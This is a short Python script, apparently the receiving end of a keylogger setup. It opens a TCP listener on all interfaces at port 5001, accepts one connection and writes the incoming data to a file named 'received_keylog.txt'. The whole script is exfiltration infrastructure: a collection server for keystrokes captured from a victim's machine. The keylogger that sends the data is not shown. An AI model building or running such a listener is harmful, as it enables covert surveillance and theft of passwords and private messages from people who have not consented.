import socket

HOST = "0.0.0.0"
PORT = 5001


def receive_file():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"[*] Listening on {HOST}:{PORT}...")

        conn, addr = server_socket.accept()
        with conn:
            print(f"[+] Connection from {addr}")

            filename = "received_keylog.txt"
            with open(filename, "wb") as file:
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    file.write(data)

            print(f"[+] File received and saved as '{filename}'")


if __name__ == "__main__":
    receive_file()
